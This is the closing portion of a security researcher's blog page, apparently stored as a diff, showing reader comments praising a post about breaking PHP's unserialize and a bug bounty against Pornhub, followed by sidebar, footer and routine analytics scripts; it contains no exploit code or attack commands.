+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5783#respond' onclick='return addComment.moveForm( "comment-5783", "5783", "respond", "1872" )' aria-label='Reply to vjeran'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5781"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/10468ad8d146df7dc85e4f8c51ef542e?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/10468ad8d146df7dc85e4f8c51ef542e?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>blah</h5><!-- Comment Maker Name -->
+<span class="date">July 24, 2016 at 08:44</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">You could have easily made 10x as much.</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5781#respond' onclick='return addComment.moveForm( "comment-5781", "5781", "respond", "1872" )' aria-label='Reply to blah'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5779"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/1f1fbe32afb6c4f41f2599692d1f7c2a?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/1f1fbe32afb6c4f41f2599692d1f7c2a?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5><a href='http://8th-dev.com' rel='external nofollow' class='url'>Ron</a></h5><!-- Comment Maker Name -->
+<span class="date">July 24, 2016 at 07:10</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Very interesting, thank you!</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5779#respond' onclick='return addComment.moveForm( "comment-5779", "5779", "respond", "1872" )' aria-label='Reply to Ron'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5774"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Ajepe</h5><!-- Comment Maker Name -->
+<span class="date">July 24, 2016 at 00:16</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Whao! this is great.</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5774#respond' onclick='return addComment.moveForm( "comment-5774", "5774", "respond", "1872" )' aria-label='Reply to Ajepe'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5773"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/ad7887d5fe7b1eaeb0af8605b57acd68?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/ad7887d5fe7b1eaeb0af8605b57acd68?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>KroKite</h5><!-- Comment Maker Name -->
+<span class="date">July 24, 2016 at 00:05</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Amazing job. Waiting for Breaking PHP's Garbage collection article :)</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5773#respond' onclick='return addComment.moveForm( "comment-5773", "5773", "respond", "1872" )' aria-label='Reply to KroKite'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5772"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>ChinoAntrax</h5><!-- Comment Maker Name -->
+<span class="date">July 23, 2016 at 23:59</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">U guys r 1337 h4x0r's, huh? Lol jk, had to make old school 1337 sp34k joke. 
+
+In all seriousness, it is a pretty dank thing you guys did. Salute.</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5772#respond' onclick='return addComment.moveForm( "comment-5772", "5772", "respond", "1872" )' aria-label='Reply to ChinoAntrax'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5771"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>ez</h5><!-- Comment Maker Name -->
+<span class="date">July 23, 2016 at 23:52</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Good job guys!</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5771#respond' onclick='return addComment.moveForm( "comment-5771", "5771", "respond", "1872" )' aria-label='Reply to ez'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5769"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/39c5b65dc827de6d80137b566bbb696c?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/39c5b65dc827de6d80137b566bbb696c?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5><a href='http://incolumitas.com' rel='external nofollow' class='url'>Nikolai</a></h5><!-- Comment Maker Name -->
+<span class="date">July 23, 2016 at 23:15</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Hohen Respekt! Ich mache auch meinen Master in CS und bin etwas in Security interessiert, aber habe kein Wort von dem low level zeugs verstanden oO mad skills</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5769#respond' onclick='return addComment.moveForm( "comment-5769", "5769", "respond", "1872" )' aria-label='Reply to Nikolai'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	<ul class="children">
+<li>
+
+<div class="comment" id="comment5770"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/4cf31ddf7fbad55d005fc09424a5b41a?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/4cf31ddf7fbad55d005fc09424a5b41a?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Ruslan Habalov</h5><!-- Comment Maker Name -->
+<span class="date">July 23, 2016 at 23:28</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Vielen Dank :)!</p></div><!-- #comment box -->
+
+<div class="button"></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5767"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>annon</h5><!-- Comment Maker Name -->
+<span class="date">July 23, 2016 at 22:23</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">How long did it take to develop the exploit/attach from start to finish?</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5767#respond' onclick='return addComment.moveForm( "comment-5767", "5767", "respond", "1872" )' aria-label='Reply to annon'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	<ul class="children">
+<li>
+
+<div class="comment" id="comment5768"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/4cf31ddf7fbad55d005fc09424a5b41a?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/4cf31ddf7fbad55d005fc09424a5b41a?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Ruslan Habalov</h5><!-- Comment Maker Name -->
+<span class="date">July 23, 2016 at 22:45</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">I would estimate about 120 hours.</p></div><!-- #comment box -->
+
+<div class="button"></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5766"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Bigt0m</h5><!-- Comment Maker Name -->
+<span class="date">July 23, 2016 at 21:00</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Fantastic job and great article !!!</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5766#respond' onclick='return addComment.moveForm( "comment-5766", "5766", "respond", "1872" )' aria-label='Reply to Bigt0m'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5765"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Ibram</h5><!-- Comment Maker Name -->
+<span class="date">July 23, 2016 at 20:36</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Wow!</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5765#respond' onclick='return addComment.moveForm( "comment-5765", "5765", "respond", "1872" )' aria-label='Reply to Ibram'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5764"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo avatar-default' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5>Manulaiko</h5><!-- Comment Maker Name -->
+<span class="date">July 23, 2016 at 19:41</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Damn, what a great work!</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5764#respond' onclick='return addComment.moveForm( "comment-5764", "5764", "respond", "1872" )' aria-label='Reply to Manulaiko'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+<li>
+
+<div class="comment" id="comment5763"><!-- start of new comment goes inside the li -->
+
+<div class="avatar">
+
+<img alt='' src='https://secure.gravatar.com/avatar/12a40b7020a00b208daca767b753ae58?s=75&#038;d=retro&#038;r=g' srcset='https://secure.gravatar.com/avatar/12a40b7020a00b208daca767b753ae58?s=150&amp;d=retro&amp;r=g 2x' class='image_border avatar-75 photo' height='75' width='75' />
+</div><!-- #avatar -->
+
+
+<div class="comment_holder">
+<h5><a href='https://www.damianschwyrz.de' rel='external nofollow' class='url'>Damian Schwyrz</a></h5><!-- Comment Maker Name -->
+<span class="date">July 23, 2016 at 16:56</span><!-- #comment date -->
+<div class="comment_box"><p class="no_margin_bottom">Danke für die Insights! Gute Arbeit (wie immer) ;)</p></div><!-- #comment box -->
+
+<div class="button"><a rel='nofollow' class='imgf reply round_edges' href='https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/?replytocom=5763#respond' onclick='return addComment.moveForm( "comment-5763", "5763", "respond", "1872" )' aria-label='Reply to Damian Schwyrz'>Reply</a></div><!-- #button -->
+
+</div><!-- #comment_holder -->
+
+</div><!-- #comment -->
+    
+
+	</li><!-- #comment-## -->
+
+</ol>
+        
+<a href="#respond">Leave a comment</a>
+
+
+
+
+</div><!-- #left -->
+
+<div id="right">
+
+<div id="lt_sidebar_last_comments_widgets-2" class="widget-container lt_sidebar_last_comments_widgets rightwidget"><div class="heading"><div class="heading_bg"><h2>Recent comments</h2></div></div><!-- #heading -->       <div class="popular_news">
+	          	   
+
+<div class="image">
+<a href="https://www.evonide.com/non-root-gpu-passthrough-setup/#comment9105">
+<img src="https://www.evonide.com/wp-content/uploads/2016/02/GPU_passthrough-1024x683_thumb.jpg" width="75" height="75" alt="Non-root GPU passthrough setup" align="left" class="imgborder"/>
+</a>
+</div><!-- #image -->
+
+<div class="content"><h3><a href="https://www.evonide.com/non-root-gpu-passthrough-setup/#comment9105">Non-root GPU passthrough setup</a></h3></div>
+
+<div class="commentauthor"><h5>Ruslan Habalov</h5></div>
+
+<div class="content"><p>
+Hi Romulo, unfortunately I haven't tried out using surround audio for this setup. Please let us know [...]</p>
+</div>
+
+
+</div><!-- #latest_news -->
+     <div class="popular_news">
+	          	   
+
+<div class="image">
+<a href="https://www.evonide.com/non-root-gpu-passthrough-setup/#comment9034">
+<img src="https://www.evonide.com/wp-content/uploads/2016/02/GPU_passthrough-1024x683_thumb.jpg" width="75" height="75" alt="Non-root GPU passthrough setup" align="left" class="imgborder"/>
+</a>
+</div><!-- #image -->
+
+<div class="content"><h3><a href="https://www.evonide.com/non-root-gpu-passthrough-setup/#comment9034">Non-root GPU passthrough setup</a></h3></div>
+
+<div class="commentauthor"><h5>Romulo</h5></div>
+
+<div class="content"><p>
+I may be somewhat pretty late, but, you can get surround audio from this setup? I've been using jack [...]</p>
+</div>
+
+
+</div><!-- #latest_news -->
+     </div><!-- #right_widget -->
+<div class="left_column">
+
+
+</div><!-- #left_column -->
+
+<div class="right_column">
+
+
+</div><!-- #right_column -->
+
+
+</div><!-- #right -->
+
+
+
+</div><!-- #content_bg -->
+
+</div><!-- #content -->
+
+</div><!-- #container -->
+
+</div><!-- #center -->
+
+<div id="footer_holder" >
+
+<div id="footer" >
+
+<div class="column_1">
+
+<div id="lt_social_icons-2" class="widget"><div class="heading"><h5>Evonide on social media</h5></div>     
+    
+     <ul id="social_icons">
+     <li><a href="https://www.twitter.com/evonide" target="_blank"><img src="https://www.evonide.com/wp-content/themes/Broadcast/images/twitter_social_icon.png" width="28" height="28" alt="Visit Evonide on Twitter" class="socialimg imgf"/><span class="socialtext">Twitter</span></a></li>
+
+     <li><a href="https://www.linkedin.com/in/ruslan-habalov-a74734a1" target="_blank"><img src="https://www.evonide.com/wp-content/themes/Broadcast/images/linkedin_social_icon.png" width="28" height="28" alt="Follow Evonide on LinkedIn" class="socialimg imgf"/><span class="socialtext">LinkedIn</span></a></li>
+
+     
+     <li><a href="https://www.evonide.com?feed=rss2" target="_blank"><img src="https://www.evonide.com/wp-content/themes/Broadcast/images/rss_social_icon.png" width="28" height="28" alt="Subscribe to Evonide RSS feed" class="socialimg imgf"/><span class="socialtext">RSS Feed</span></a></li>
+     
+     
+     
+     </ul>
+     
+     
+	   </div><!-- #widget -->
+</div><!-- #column_1 -->
+
+<div class="column_2">
+
+		<div id="recent-posts-2" class="widget">		<div class="heading"><h5>Recent Posts</h5></div>		<ul>
+					<li>
+				<a href="https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/">Breaking PHP&#8217;s Garbage Collection and Unserialize</a>
+						</li>
+					<li>
+				<a href="https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/">How we broke PHP, hacked Pornhub and earned $20,000</a>
+						</li>
+					<li>
+				<a href="https://www.evonide.com/fuzzing-unserialize/">Fuzzing Unserialize</a>
+						</li>
+					<li>
+				<a href="https://www.evonide.com/non-root-gpu-passthrough-setup/">Non-root GPU passthrough setup</a>
+						</li>
+					<li>
+				<a href="https://www.evonide.com/teamspeak-2-session-hijacking/">TeamSpeak 2 Session Hijacking</a>
+						</li>
+				</ul>
+		</div><!-- #widget -->		
+</div><!-- #column_2 -->
+
+<div class="column_3">
+
+<div id="tag_cloud-2" class="widget"><div class="heading"><h5>Tags</h5></div><div class="tagcloud"><a href="https://www.evonide.com/tag/breaking-php/" class="tag-cloud-link tag-link-53 tag-link-position-1" style="font-size: 22pt;" aria-label="breaking PHP (3 items)">breaking PHP</a>
+<a href="https://www.evonide.com/tag/breaking-unserialize/" class="tag-cloud-link tag-link-62 tag-link-position-2" style="font-size: 8pt;" aria-label="breaking unserialize (1 item)">breaking unserialize</a>
+<a href="https://www.evonide.com/tag/bug-bounty/" class="tag-cloud-link tag-link-59 tag-link-position-3" style="font-size: 8pt;" aria-label="bug bounty (1 item)">bug bounty</a>
+<a href="https://www.evonide.com/tag/fuzzer/" class="tag-cloud-link tag-link-61 tag-link-position-4" style="font-size: 8pt;" aria-label="fuzzer (1 item)">fuzzer</a>
+<a href="https://www.evonide.com/tag/fuzzing/" class="tag-cloud-link tag-link-60 tag-link-position-5" style="font-size: 8pt;" aria-label="fuzzing (1 item)">fuzzing</a>
+<a href="https://www.evonide.com/tag/garbage-collection/" class="tag-cloud-link tag-link-51 tag-link-position-6" style="font-size: 16.4pt;" aria-label="garbage collection (2 items)">garbage collection</a>
+<a href="https://www.evonide.com/tag/gpu-isolation/" class="tag-cloud-link tag-link-46 tag-link-position-7" style="font-size: 8pt;" aria-label="GPU isolation (1 item)">GPU isolation</a>
+<a href="https://www.evonide.com/tag/gpu-passthrough/" class="tag-cloud-link tag-link-45 tag-link-position-8" style="font-size: 8pt;" aria-label="GPU passthrough (1 item)">GPU passthrough</a>
+<a href="https://www.evonide.com/tag/hackerone/" class="tag-cloud-link tag-link-58 tag-link-position-9" style="font-size: 8pt;" aria-label="hackerone (1 item)">hackerone</a>
+<a href="https://www.evonide.com/tag/hacking-pornhub/" class="tag-cloud-link tag-link-56 tag-link-position-10" style="font-size: 8pt;" aria-label="hacking pornhub (1 item)">hacking pornhub</a>
+<a href="https://www.evonide.com/tag/passthrough/" class="tag-cloud-link tag-link-49 tag-link-position-11" style="font-size: 8pt;" aria-label="passthrough (1 item)">passthrough</a>
+<a href="https://www.evonide.com/tag/php/" class="tag-cloud-link tag-link-64 tag-link-position-12" style="font-size: 22pt;" aria-label="PHP (3 items)">PHP</a>
+<a href="https://www.evonide.com/tag/pornhub/" class="tag-cloud-link tag-link-55 tag-link-position-13" style="font-size: 8pt;" aria-label="pornhub (1 item)">pornhub</a>
+<a href="https://www.evonide.com/tag/prng/" class="tag-cloud-link tag-link-41 tag-link-position-14" style="font-size: 8pt;" aria-label="PRNG (1 item)">PRNG</a>
+<a href="https://www.evonide.com/tag/pseudorandom-number-generator/" class="tag-cloud-link tag-link-42 tag-link-position-15" style="font-size: 8pt;" aria-label="pseudorandom number generator (1 item)">pseudorandom number generator</a>
+<a href="https://www.evonide.com/tag/qemu/" class="tag-cloud-link tag-link-47 tag-link-position-16" style="font-size: 8pt;" aria-label="QEMU (1 item)">QEMU</a>
+<a href="https://www.evonide.com/tag/session-hijacking/" class="tag-cloud-link tag-link-43 tag-link-position-17" style="font-size: 8pt;" aria-label="session hijacking (1 item)">session hijacking</a>
+<a href="https://www.evonide.com/tag/teamspeak-2/" class="tag-cloud-link tag-link-40 tag-link-position-18" style="font-size: 8pt;" aria-label="TeamSpeak 2 (1 item)">TeamSpeak 2</a>
+<a href="https://www.evonide.com/tag/unserialize/" class="tag-cloud-link tag-link-50 tag-link-position-19" style="font-size: 22pt;" aria-label="unserialize (3 items)">unserialize</a>
+<a href="https://www.evonide.com/tag/use-after-free/" class="tag-cloud-link tag-link-54 tag-link-position-20" style="font-size: 22pt;" aria-label="use-after-free (3 items)">use-after-free</a>
+<a href="https://www.evonide.com/tag/vga-passthrough/" class="tag-cloud-link tag-link-48 tag-link-position-21" style="font-size: 8pt;" aria-label="VGA passthrough (1 item)">VGA passthrough</a>
+<a href="https://www.evonide.com/tag/zvals/" class="tag-cloud-link tag-link-52 tag-link-position-22" style="font-size: 8pt;" aria-label="zvals (1 item)">zvals</a></div>
+</div><!-- #widget -->
+</div><!-- #column_3 -->
+
+<div class="column_4">
+
+<div id="text-2" class="widget"><div class="heading"><h5>Meta</h5></div>			<div class="textwidget"><ul>
+<li><a href="http://www.evonide.com/">Home</a></li>
+<li><a href="http://www.evonide.com/about-me/">About Me</a></li>		
+<li><a href="http://www.evonide.com/contact/">Contact</a></li>			
+<li><a href="http://www.evonide.com/legal-notice/">Legal Notice</a></li>
+</ul></div>
+		</div><!-- #widget -->
+</div><!-- #column_4 -->
+
+</div><!-- #footer -->
+
+</div><!-- #footer_holder -->
+
+<div id="copyright_holder">
+
+<div class="copyright">
+
+<div class="left">&copy; 2014-2017 Evonide All Rights Reserved.</div><!-- #left -->
+
+<div class="right">Powered by Wordpress.</div><!-- #right -->
+
+</div><!-- #copyright -->
+
+</div><!-- #copyright_holder -->
+
+	<script type='text/javascript'>
+	function tiny_spoiler( id )
+	{
+		if ( document.getElementById( id ).style.height == 'auto' )
+		{
+			document.getElementById( id ).style.height = 0;
+			document.getElementById( id ).style.padding = 0;
+			document.getElementById( id + '_button' ).value = '+';
+		}
+		else
+		{
+			document.getElementById( id ).style.height = 'auto';
+			document.getElementById( id ).style.padding = '10px';
+			document.getElementById( id + '_button' ).value = '-';
+		}
+	}
+	</script><link rel='stylesheet' id='yarppRelatedCss-css'  href='https://www.evonide.com/wp-content/plugins/yet-another-related-posts-plugin/style/related.css?ver=4.8' type='text/css' media='all' />
+<script type='text/javascript'>
+/* <![CDATA[ */
+var tocplus = {"visibility_show":"show","visibility_hide":"hide","width":"Auto"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.evonide.com/wp-content/plugins/table-of-contents-plus/front.min.js?ver=1509'></script>
+<script type='text/javascript' src='https://www.evonide.com/wp-includes/js/wp-embed.min.js?ver=4.8'></script>
+
+<!-- Piwik -->
+<script type="text/javascript">
+
+    var _paq = _paq || [];
+
+    (function() {
+        var u=(("https:" == document.location.protocol) ? "https" : "http") + "://www.evonide.com/pk/";
+        _paq.push(['trackPageView']);
+        _paq.push(['enableLinkTracking']);
+        _paq.push(['setTrackerUrl', u+'pk.php']);
+        _paq.push(['setSiteId', 1]);
+        var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+        g.type='text/javascript';
+        g.defer=true; g.async=true; g.src=u+'pk.js';
+        s.parentNode.insertBefore(g,s);
+    })();
+
+</script>
+<!-- End Piwik Code -->
+<noscript><p><img src="/pk/pk.php?idsite=1&rec=1" style="border:0;" alt="" /></p></noscript>
+
+<script type="text/javascript">
+$(document).ready(
+function(){
+$("#featured").tabs({fx:{opacity: "toggle"}}).tabs("rotate", 15000, true)
+$("#featured iframe, #featured embed, #featured object").hover(
+function() {
+$("#featured").tabs("rotate",0,true);
+});
+});
+</script>
+
+</body>
+</html>
+
+
+<!--
+Cachify | http://cachify.de
+Ohne Plugin: 78 DB-Anfragen, 0.16 Sekunden, 6.52 MB
+Mit Plugin: 22 DB-Anfragen, 0.30 Sekunden, 5.93 MB
+Generiert: 4 hours zuvor
+-->
